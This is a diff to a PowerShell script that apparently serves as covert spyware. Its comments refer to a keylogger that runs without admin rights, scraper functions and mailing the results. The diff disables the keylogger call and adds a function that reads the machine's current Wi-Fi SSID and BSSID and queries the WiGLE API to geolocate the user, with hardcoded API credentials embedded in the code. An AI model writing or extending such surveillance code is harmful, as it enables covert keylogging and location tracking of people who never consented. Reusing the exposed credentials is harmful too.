@@ -22,13 +22,17 @@ Measure-Command { commandToExecute }
 https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-local-admins-group-on-a-remote-server
 #>
 
-
+### Add information to results
 function Main(){
+$results = "starters"
 #initialize
 #$results = nonAdministrativeScrapperFunctions
-#mail $results
+
 ### Runs Key logger (does not require admin privs)
-keyLogger
+#keyLogger
+$results += findGeoLocation
+$results
+#mail $results
 }
 
 function debug(){
@@ -265,11 +269,55 @@ $scriptBlock = [scriptblock]::Create($command)
 $job = start-Job -scriptblock $scriptBlock
 ### DEBUG
 #$job | Format-List -Property *
-#echo "akakakakak"
 }
 
-### Type definition is used for the key logger and is called in main function
-### command used for running block "[KeyLogger.Program]::Main();"
+
+### Finds geolocation by searching the WIGLE database with the current SSID and the BSSID of the current connected AP
+# This function uses an authentication token given by WIGLE.
+# API docs can be found here : https://api.wigle.net/swagger#/Network%20search%20and%20information%20tools/search_1
+# TODO add try catch to filter pc's with no wireless connection
+function findGeoLocation(){
+	
+	# Gets current AP 
+	$strDump = netsh wlan show interfaces
+	# PARSING....
+	$objInterface = "" | Select-Object SSID,BSSID
+
+	foreach ($strLine in $strDump) {
+		if ($strLine -match "^\s+SSID") {
+			$objInterface.SSID = $strLine -Replace "^\s+SSID\s+:\s+",""
+		} elseif ($strLine -match "^\s+BSSID") {
+			$objInterface.BSSID = $strLine -Replace "^\s+BSSID\s+:\s+",""
+		}
+	}
+	
+	#Variable isolation
+	$SSID = $objInterface.SSID
+	$BSSID = $objInterface.BSSID
+
+
+	# Building the final URI
+	$uri = "https://api.wigle.net/api/v2/network/search?onlymine=false&first=0&freenet=false&paynet=false&netid="+$BSSID+"&ssid="+$SSID
+	# Auth tokens
+	$user = 'AIDeeed5624aa547065e149f4c3067b8a26'
+	$pass = '4146a9f04324cc281439e23da8ec5686'
+	# Creating pair used for encoding 
+	$pair = "$($user):$($pass)"
+
+	$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))
+
+	$basicAuthValue = "Basic $encodedCreds"
+	# Building headers
+	$Headers = @{
+		Authorization = $basicAuthValue
+	}
+	# Making actual request
+	$response = Invoke-RestMethod -Uri $uri -Headers $Headers
+	$response
+	$response.results
+	
+	
+}
 
 
 
